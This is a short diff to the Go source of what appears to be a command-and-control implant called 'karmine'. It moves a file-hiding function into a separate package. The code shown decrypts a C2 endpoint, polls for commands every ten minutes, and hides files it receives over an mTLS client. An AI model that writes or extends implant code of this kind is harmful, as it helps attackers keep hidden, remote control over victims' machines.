@@ -16,6 +16,7 @@ import (
 
 	"github.com/pygrum/karmine/client"
 	ex "github.com/pygrum/karmine/karma/cmd/exec"
+	"github.com/pygrum/karmine/karma/hide"
 	"github.com/pygrum/karmine/krypto/kes"
 	"github.com/pygrum/karmine/krypto/kryptor"
 	"github.com/pygrum/karmine/models"
@@ -46,7 +47,7 @@ func main() {
 		waitSecondsInt = 600 // default loop time until next command is 10 minutes
 	}
 	if _, err := os.Stat(InitPFile); err == nil {
-		HideF(InitPFile)
+		hide.HideF(InitPFile)
 	}
 	ticker := time.NewTicker(time.Duration(time.Duration(waitSecondsInt) * time.Second))
 	endpointStr, err := kryptor.Decrypt(c2Endpoint, X1, X2)
@@ -127,7 +128,7 @@ func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mT
 }
 
 func handleFile(cmdID int, fname, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
-	HideF(fname)
+	hide.HideF(fname)
 	if runtime.GOOS == "linux" {
 		fname = "./" + fname
 	}
